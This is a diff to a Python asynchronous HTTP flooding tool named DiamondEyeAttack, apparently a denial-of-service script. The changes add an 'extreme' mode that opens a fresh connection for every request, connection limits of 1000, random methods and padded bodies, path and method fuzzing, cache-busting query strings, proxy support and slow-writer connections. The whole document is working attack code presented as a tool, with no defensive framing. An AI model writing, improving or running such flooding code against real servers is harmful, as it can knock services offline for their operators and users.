@@ -5,7 +5,7 @@ import time
 from urllib.parse import urlparse
 from typing import List, Dict
 
-from utils import generate_headers, parse_data_size
+from utils import generate_headers, parse_data_size, random_string
 from colorama import Fore, Style
 
 
@@ -53,11 +53,29 @@ class DiamondEyeAttack:
         self._shutdown_event = asyncio.Event()
         self._slow_writers = []
 
+        self._monitor_task = None
+        self._rps_task = None
+
     async def start(self):
+        if self.extreme:
+            # Не держим keepalive — каждый запрос новое соединение
+            limits = httpx.Limits(
+                max_connections=1000,
+                max_keepalive_connections=0,
+                keepalive_expiry=1.0
+            )
+        else:
+            # Обычный режим — немного keepalive
+            limits = httpx.Limits(
+                max_connections=1000,
+                max_keepalive_connections=20,
+                keepalive_expiry=5.0
+            )
+
         base_kwargs = {
             "verify": not self.no_ssl_check,
             "timeout": httpx.Timeout(10.0),
-            "limits": httpx.Limits(max_keepalive_connections=100, max_connections=1000),
+            "limits": limits,
         }
         if self.use_http2 and not self.extreme:
             base_kwargs["http2"] = True
@@ -65,11 +83,11 @@ class DiamondEyeAttack:
             base_kwargs["proxies"] = self.proxy
 
         tasks = [asyncio.create_task(self.worker(base_kwargs)) for _ in range(self.workers)]
-        monitor_task = asyncio.create_task(self.monitor())
-        rps_task = asyncio.create_task(self.collect_rps_stats())
+        self._monitor_task = asyncio.create_task(self.monitor())
+        self._rps_task = asyncio.create_task(self.collect_rps_stats())
 
         try:
-            await asyncio.gather(*tasks, monitor_task, rps_task, return_exceptions=True)
+            await asyncio.gather(*tasks, self._monitor_task, self._rps_task, return_exceptions=True)
         except asyncio.CancelledError:
             pass
 
@@ -82,7 +100,6 @@ class DiamondEyeAttack:
                 clients.append(client)
 
             while not self._shutdown_event.is_set():
-                client = random.choice(clients)
                 method = self.get_random_method()
                 url = self.build_random_url()
                 headers = generate_headers(
@@ -97,17 +114,21 @@ class DiamondEyeAttack:
                 data = None
                 BODY_METHODS = {'POST', 'PUT', 'PATCH', 'PROPFIND', 'REPORT', 'MKCOL', 'LOCK'}
                 if method in BODY_METHODS and self.data_size > 0:
-                    size = self.data_size
-                    json_size = max(1, size - 10)
                     if random.random() < 0.5:
-                        data = f'{{"data": "{random_string(json_size)}"}}'
+                        payload_size = max(1, self.data_size - 15)
+                        data = f'{{"d": "{random_string(payload_size)}"}}'
                     else:
-                        data = 'X' * size
+                        data = 'X' * self.data_size
 
                 if self.extreme:
-                    async with httpx.AsyncClient(**base_kwargs) as temp_client:
+                    temp_client = httpx.AsyncClient(**base_kwargs)
+                    try:
+                        await temp_client.__aenter__()
                         await self.send_request(temp_client, method, url, headers, data)
+                    finally:
+                        await temp_client.aclose()
                 else:
+                    client = random.choice(clients)
                     await self.send_request(client, method, url, headers, data)
 
                 if random.random() < self.slow_rate:
@@ -115,7 +136,7 @@ class DiamondEyeAttack:
                     self.active_tasks.add(task)
                     task.add_done_callback(lambda t: self.active_tasks.discard(t))
 
-                await asyncio.sleep(0.0001 if self.flood else random.uniform(0.01, 0.1))
+                await asyncio.sleep(0.001 if self.flood else random.uniform(0.01, 0.1))
 
         finally:
             for client in clients:
@@ -169,6 +190,8 @@ class DiamondEyeAttack:
                     await asyncio.wait_for(writer.drain(), timeout=1.0)
                 except:
                     break
+                if self._shutdown_event.is_set():
+                    break
                 await asyncio.sleep(0.1 + random.uniform(0.0, 0.3))
         except Exception:
             pass
@@ -211,6 +234,11 @@ class DiamondEyeAttack:
             return
         self._shutdown_event.set()
 
+        if self._monitor_task:
+            self._monitor_task.cancel()
+        if self._rps_task:
+            self._rps_task.cancel()
+
         for writer in self._slow_writers[:]:
             try:
                 writer.close()
@@ -230,3 +258,16 @@ class DiamondEyeAttack:
         self.active_tasks.clear()
 
         await asyncio.sleep(0.1)
+
+    def get_random_method(self) -> str:
+        if self.method_fuzz and random.random() < 0.3:
+            return random.choice(self.fuzz_methods)
+        return random.choice(self.methods)
+
+    def build_random_url(self) -> str:
+        path = random.choice(self.paths)
+        if self.path_fuzz:
+            depth = random.randint(2, 5)
+            path += "/" + "/".join(random_string(8) for _ in range(depth))
+        query = f"?t={random.randint(1000, 9999)}"
+        return self.base_url + path + query
